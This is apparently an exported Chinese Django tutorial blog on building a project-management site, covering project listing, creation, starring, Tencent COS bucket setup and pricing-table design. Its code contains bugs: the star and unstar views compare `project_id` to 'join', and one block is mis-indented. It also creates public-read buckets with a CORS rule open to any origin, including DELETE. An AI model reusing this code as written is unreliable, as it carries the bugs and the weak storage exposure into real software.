class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with id=widget.attrs.id %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> &#123;% <span class="attr">if</span> <span class="attr">id</span> %&#125; <span class="attr">id</span>=<span class="string">"&#123;&#123; id &#125;&#125;"</span>&#123;% <span class="attr">endif</span> %&#125;&#123;% <span class="attr">if</span> <span class="attr">widget.attrs.class</span> %&#125; <span class="attr">class</span>=<span class="string">"&#123;&#123; widget.attrs.class &#125;&#125;"</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span></span><br><span class="line">        &#123;% for group, options, index in widget.optgroups %&#125;</span><br><span class="line">            &#123;% for option in options %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> &#123;% <span class="attr">if</span> <span class="attr">option.attrs.id</span> %&#125; <span class="attr">for</span>=<span class="string">"&#123;&#123; option.attrs.id &#125;&#125;"</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span></span><br><span class="line">                    &#123;% include option.template_name with widget=option %&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><p><code>radio_option.html 文件</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%  include <span class="string">"django/forms/widgets/input.html"</span> %&#125;</span><br><span class="line">&lt;span class="cycle" style="background-color: &#123;&#123; option.label &#125;&#125;"&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure><ul><li>form表单的修改</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="keyword">from</span> web.forms.widgets <span class="keyword">import</span> ColorRadioSelect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProjectModelForm</span><span class="params">(BootSrtapForm, forms.ModelForm)</span>:</span></span><br><span class="line">    bootstrap_class_exclude = [<span class="string">'color'</span>]</span><br><span class="line">    <span class="comment"># desc = forms.CharField(widget=forms.Textarea())</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Project</span><br><span class="line">        fields = [<span class="string">'name'</span>, <span class="string">'color'</span>, <span class="string">'desc'</span>]</span><br><span class="line">        widgets = &#123;</span><br><span class="line">            <span class="string">'color'</span>: ColorRadioSelect(attrs=&#123;<span class="string">'class'</span>: <span class="string">'color-radio'</span>&#125;),</span><br><span class="line">            <span class="string">'desc'</span>: forms.Textarea,</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><h3 id="8-5-项目的视图函数"><a href="#8-5-项目的视图函数" class="headerlink" title="8.5 项目的视图函数"></a>8.5 项目的视图函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.从数据库中获取两个部分的数据</span><br><span class="line">我创建的所有项目：已星标、未星标</span><br><span class="line">我参与的所有项目：已星标、未星标</span><br><span class="line">2.提取已星标</span><br><span class="line"> 列表 &#x3D; 循环[我创建的所有项目] + [我参与的所有项目] 提取已新标的数据</span><br><span class="line">得到三个列表：星标、创建、参与</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse, redirect</span><br><span class="line"><span class="keyword">from</span> web.forms.project <span class="keyword">import</span> ProjectModelForm</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> utils.tencent <span class="keyword">import</span> cos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_list</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""项目列表"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="comment"># 查看所有的项目</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        1.从数据库中获取两个部分的数据</span></span><br><span class="line"><span class="string">            我创建的所有项目：已星标、未星标</span></span><br><span class="line"><span class="string">            我参与的所有项目：已星标、未星标</span></span><br><span class="line"><span class="string">        2.提取已星标</span></span><br><span class="line"><span class="string">            列表 = 循环[我创建的所有项目] + [我参与的所有项目] 提取已新标的数据</span></span><br><span class="line"><span class="string">        得到三个列表：星标、创建、参与</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        project_dict = &#123;<span class="string">'star'</span>: [], <span class="string">'my'</span>: [], <span class="string">'join'</span>: []&#125;</span><br><span class="line">        <span class="comment"># 我创建的所有项目</span></span><br><span class="line">        my_project_list = models.Project.objects.filter(creator=request.tracer.user)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> my_project_list:</span><br><span class="line">            <span class="keyword">if</span> row.star:</span><br><span class="line">                project_dict[<span class="string">'star'</span>].append(&#123;<span class="string">'value'</span>: row, <span class="string">'type'</span>: <span class="string">'my'</span>&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                project_dict[<span class="string">'my'</span>].append(row)</span><br><span class="line">        <span class="comment"># 我参与的所有项目</span></span><br><span class="line">        join_project_list = models.ProjectUser.objects.filter(user=request.tracer.user)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> join_project_list:</span><br><span class="line">            <span class="keyword">if</span> item.star:</span><br><span class="line">                project_dict[<span class="string">'star'</span>].append(&#123;<span class="string">'value'</span>: item.project, <span class="string">'type'</span>: <span class="string">'join'</span>&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                project_dict[<span class="string">'join'</span>].append(item.project)</span><br><span class="line"></span><br><span class="line">        form = ProjectModelForm(request)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'project/project_list.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'project_dict'</span>: project_dict&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">###### 创建项目 ######</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h3 id="8-6-创建项目"><a href="#8-6-创建项目" class="headerlink" title="8.6 创建项目"></a>8.6 创建项目</h3><p>为创建项目的模态框的确定按钮绑定事件，发送ajax请求到后台进行创建项目。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        bindSubmit();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindSubmit</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnSubmit'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">                url: <span class="string">"&#123;% url 'project_list' %&#125;"</span>,</span></span><br><span class="line"><span class="actionscript">                type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="javascript">                data: $(<span class="string">'#addForm'</span>).serialize(),</span></span><br><span class="line"><span class="actionscript">                dataType: <span class="string">"JSON"</span>,</span></span><br><span class="line"><span class="actionscript">                success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(res);</span></span><br><span class="line">                    if (res.status) &#123;</span><br><span class="line"><span class="actionscript">                        location.href = location.href;  <span class="comment">//让页面主动刷新一下</span></span></span><br><span class="line">                        &#123;# location.reload()#&#125;</span><br><span class="line"><span class="actionscript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                            $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                                $(<span class="string">'#id_'</span> + key).next().text(value[<span class="number">0</span>]);</span></span><br><span class="line"></span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后台接收导数据，创建项目，创建项目还需创建桶，用于项目上传文件，创建桶基于腾讯云的cos上传文件，参考腾讯cos上传文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_list</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""项目列表"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        ......</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># POST请求 创建项目</span></span><br><span class="line">    form = ProjectModelForm(request, data=request.POST)</span><br><span class="line">        <span class="keyword">if</span> form.is_valid():</span><br><span class="line">            name = form.cleaned_data[<span class="string">'name'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">########  为项目创建桶 ###########</span></span><br><span class="line">            <span class="comment"># 1.为项目创建一个桶</span></span><br><span class="line">            bucket = <span class="string">"&#123;&#125;-&#123;&#125;-&#123;&#125;-1302636832"</span>.format(name,request.tracer.user.mobile_phone, str(int(time.time())))</span><br><span class="line">            region = <span class="string">'ap-nanjing'</span></span><br><span class="line">            cos.create_bucket(bucket, region)</span><br><span class="line">            <span class="comment"># 把桶和区域写入到数据库</span></span><br><span class="line">            form.instance.bucket = bucket</span><br><span class="line">            form.instance.region = region</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 2.创建项目</span></span><br><span class="line">            <span class="comment"># 验证通过：项目名、颜色、描述 + creator创建者</span></span><br><span class="line">            form.instance.creator = request.tracer.user</span><br><span class="line">            <span class="comment"># 创建项目</span></span><br><span class="line">            instance = form.save()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 3. 项目初始化问题类型</span></span><br><span class="line">            issues_type_obj_list = []</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> models.IssuesTyle.PROJECT_INIT_LIST:</span><br><span class="line">                issues_type_obj_list.append(models.IssuesTyle(project=instance,title=item))</span><br><span class="line">            models.IssuesTyle.objects.bulk_create(issues_type_obj_list)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><h3 id="8-7-星标项目"><a href="#8-7-星标项目" class="headerlink" title="8.7 星标项目"></a>8.7 星标项目</h3><p>为星标创建a标签，对a标签的 <code>hre</code> 的 <code>url</code> 进行处理。</p><ul><li><code>urls.py文件</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 星标项目</span></span><br><span class="line"><span class="comment"># /project/star/my/1</span></span><br><span class="line"><span class="comment"># /project/star/join/1</span></span><br><span class="line">url(<span class="string">r'^project/star/(?P&lt;project_type&gt;\w+)/(?P&lt;project_id&gt;\d+)/$'</span>, project.project_star, name=<span class="string">'project_star'</span>),</span><br><span class="line">url(<span class="string">r'^project/unstar/(?P&lt;project_type&gt;\w+)/(?P&lt;project_id&gt;\d+)/$'</span>, project.project_unstar, name=<span class="string">'project_unstar'</span>),</span><br></pre></td></tr></table></figure><ul><li>后端处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_star</span><span class="params">(request, project_type, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""星标项目"""</span></span><br><span class="line">    <span class="keyword">if</span> project_type == <span class="string">'my'</span>:</span><br><span class="line">        models.Project.objects.filter(id=project_id, creator=request.tracer.user).update(star=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'project_list'</span>)</span><br><span class="line">    <span class="keyword">if</span> project_id == <span class="string">'join'</span>:</span><br><span class="line">        models.ProjectUser.objects.filter(id=project_id, user=request.tracer.user).update(star=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'project_list'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'请求错误'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_unstar</span><span class="params">(request, project_type, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""取消星标"""</span></span><br><span class="line">    <span class="keyword">if</span> project_type == <span class="string">'my'</span>:</span><br><span class="line">        models.Project.objects.filter(id=project_id, creator=request.tracer.user).update(star=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'project_list'</span>)</span><br><span class="line">    <span class="keyword">if</span> project_id == <span class="string">'join'</span>:</span><br><span class="line">        models.ProjectUser.objects.filter(id=project_id, user=request.tracer.user).update(star=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'project_list'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'请求错误'</span>)</span><br></pre></td></tr></table></figure><h3 id="8-8-创建腾讯cos"><a href="#8-8-创建腾讯cos" class="headerlink" title="8.8 创建腾讯cos"></a>8.8 创建腾讯cos</h3><p>根据价格策略中，每个用户都有一定的容量限制。</p><h4 id="8-8-1创建项目时创建一个桶"><a href="#8-8-1创建项目时创建一个桶" class="headerlink" title="8.8.1创建项目时创建一个桶"></a>8.8.1创建项目时创建一个桶</h4><p>在项目数据表中加入cos同名与cos区域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Project</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""项目表"""</span></span><br><span class="line">    ....</span><br><span class="line">    bucket = models.CharField(verbose_name=<span class="string">'cos桶名称'</span>,max_length=<span class="number">128</span>)</span><br><span class="line">region = models.CharField(verbose_name=<span class="string">'cos区域'</span>,max_length=<span class="number">32</span>)</span><br></pre></td></tr></table></figure><p>在<code>utils文件夹</code>下的<code>tencent文件夹</code>下创建<code>cos.py文件</code>，用于存放cos的相关代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> qcloud_cos.cos_exception <span class="keyword">import</span> CosServiceError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bucket</span><span class="params">(bucket, region=<span class="string">'ap-nanjing'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    创建桶</span></span><br><span class="line"><span class="string">    :param bucket:桶名称</span></span><br><span class="line"><span class="string">    :param region:区域</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    config = CosConfig(Region=region, SecretId=settings.TENCENT_COS_ID, SecretKey=settings.TENCENT_COS_KEY)</span><br><span class="line"></span><br><span class="line">    client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">    client.create_bucket(</span><br><span class="line">        Bucket=bucket,</span><br><span class="line">        ACL=<span class="string">"public-read"</span>  </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># private私有</span></span><br><span class="line">        <span class="comment"># public-read公共读私有写</span></span><br><span class="line">        <span class="comment"># public-read-write公共读公共写</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 跨域规则 （js上传文件到cos中遇到的问题，参考文件管理）</span></span><br><span class="line">    cors_config = &#123;</span><br><span class="line">        <span class="string">'CORSRule'</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">'AllowedOrigin'</span>: <span class="string">'*'</span>,</span><br><span class="line">                <span class="string">'AllowedMethod'</span>: [<span class="string">'GET'</span>, <span class="string">'PUT'</span>, <span class="string">'HEAD'</span>, <span class="string">'POST'</span>, <span class="string">'DELETE'</span>],</span><br><span class="line">                <span class="string">'AllowedHeader'</span>: <span class="string">'*'</span>,</span><br><span class="line">                <span class="string">'ExposeHeader'</span>: <span class="string">'*'</span>,</span><br><span class="line">                <span class="string">'MaxAgeSeconds'</span>: <span class="number">500</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">    client.put_bucket_cors(</span><br><span class="line">        Bucket=bucket,</span><br><span class="line">        CORSConfiguration=cors_config</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>在创建项目的时候通过验证<code>is_valid()</code>方法校验后创建桶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> form.is_valid():</span><br><span class="line">.....</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1.为项目创建一个桶</span></span><br><span class="line">    bucket = <span class="string">"&#123;&#125;-&#123;&#125;-&#123;&#125;-1302636832"</span>.format(name,request.tracer.user.mobile_phone, str(int(time.time())))</span><br><span class="line">    region = <span class="string">'ap-nanjing'</span></span><br><span class="line">    cos.create_bucket(bucket, region)</span><br><span class="line">    <span class="comment"># 把桶和区域写入到数据库</span></span><br><span class="line">    form.instance.bucket = bucket</span><br><span class="line">    form.instance.region = region</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.创建项目</span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 项目的开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>业务探讨 &amp; 任务</title>
      <link href="/2020/08/02/6%20%E4%B8%9A%E5%8A%A1%E6%8E%A2%E8%AE%A8%20&amp;%207%20%E4%BB%BB%E5%8A%A1/"/>
      <url>/2020/08/02/6%20%E4%B8%9A%E5%8A%A1%E6%8E%A2%E8%AE%A8%20&amp;%207%20%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="6-业务探讨"><a href="#6-业务探讨" class="headerlink" title="6 业务探讨"></a>6 业务探讨</h2><h3 id="6-1-价格策略"><a href="#6-1-价格策略" class="headerlink" title="6.1 价格策略"></a>6.1 价格策略</h3><p>项目需要用到收费的地方设置价格策略。</p><table><thead><tr><th>分类</th><th>标题</th><th>价格/年</th><th>创建项目</th><th>项目成员</th><th>项目空间</th><th>单文件</th><th>创建时间</th></tr></thead><tbody><tr><td>免费版</td><td>个人免费版</td><td>0</td><td>3</td><td>2</td><td>20M</td><td>5M</td><td></td></tr><tr><td>收费版</td><td>VIP</td><td>199</td><td>20</td><td>20</td><td>50G</td><td>500M</td><td></td></tr><tr><td>收费版</td><td>SVIP</td><td>299</td><td>50</td><td>50</td><td>100G</td><td>1G</td><td></td></tr><tr><td>其他</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>注意：新用户注册有免费版的额度</p><h3 id="6-2-交易记录"><a href="#6-2-交易记录" class="headerlink" title="6.2 交易记录"></a>6.2 交易记录</h3><table><thead><tr><th>ID</th><th>状态</th><th>用户</th><th>价格</th><th>实际支付</th><th>开始</th><th>结束</th><th>数量（年）</th><th>订单号</th></tr></thead><tbody><tr><td>1</td><td>已支付</td><td>1</td><td>1</td><td>0</td><td>2020-07-16</td><td>null</td><td>0</td><td>UY11</td></tr><tr><td>2</td><td>已支付</td><td>2</td><td>1</td><td>0</td><td>2020-07-16</td><td>null</td><td>0</td><td>UY12</td></tr><tr><td>3</td><td>已支付</td><td>3</td><td>1</td><td>0</td><td>2020-07-16</td><td>null</td><td>0</td><td>UY13</td></tr><tr><td>4</td><td>未支付/已支付</td><td>2</td><td>2</td><td>199</td><td>2020-08-16</td><td>2021-08-16</td><td>1</td><td>UY14</td></tr></tbody></table><p><strong>设置 request.tracer = 交易对象</strong></p><h3 id="6-3-创建存储"><a href="#6-3-创建存储" class="headerlink" title="6.3 创建存储"></a>6.3 创建存储</h3><p>使用腾讯对象存储COS存储数据。</p><p>参考腾讯cos上传文件。</p><h3 id="6-4-创建项目"><a href="#6-4-创建项目" class="headerlink" title="6.4 创建项目"></a>6.4 创建项目</h3><table><thead><tr><th>ID</th><th>项目名称</th><th>描述</th><th>颜色</th><th>星标</th><th>参与人数</th><th>创建者</th><th>已使用空间</th></tr></thead><tbody><tr><td>1</td><td>CRM</td><td>…</td><td>#dddd</td><td>true</td><td>5</td><td>1</td><td>5M</td></tr><tr><td>2</td><td>学习平台</td><td>…</td><td>#u777</td><td>false</td><td>10</td><td>1</td><td>1G</td></tr><tr><td>3</td><td>博客平台</td><td>…</td><td>#uu55</td><td>false</td><td>20</td><td>2</td><td>10G</td></tr></tbody></table><h3 id="6-5-项目的参与者"><a href="#6-5-项目的参与者" class="headerlink" title="6.5 项目的参与者"></a>6.5 项目的参与者</h3><table><thead><tr><th>ID</th><th>项目</th><th>用户</th><th>星标</th><th>邀请者</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>true</td><td>1</td></tr><tr><td>2</td><td>1</td><td>2</td><td>False</td><td>1</td></tr></tbody></table><h2 id="7-任务"><a href="#7-任务" class="headerlink" title="7 任务"></a>7 任务</h2><h3 id="7-1创建对应的表结构"><a href="#7-1创建对应的表结构" class="headerlink" title="7.1创建对应的表结构"></a>7.1创建对应的表结构</h3><p>根据上面的业务探讨创建对应的表结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PricePolicy</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""价格策略"""</span></span><br><span class="line">    category_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">'免费版'</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">'收费版'</span>),</span><br><span class="line">        (<span class="number">3</span>, <span class="string">'其他'</span>),</span><br><span class="line">    )</span><br><span class="line">    category = models.SmallIntegerField(verbose_name=<span class="string">"收费类型"</span>, default=<span class="number">2</span>, choices=category_choices)</span><br><span class="line">    title = models.CharField(verbose_name=<span class="string">"标题"</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    price = models.PositiveIntegerField(verbose_name=<span class="string">"价格"</span>)  <span class="comment"># PositiveIntegerField正整数类型</span></span><br><span class="line"></span><br><span class="line">    project_num = models.PositiveIntegerField(verbose_name=<span 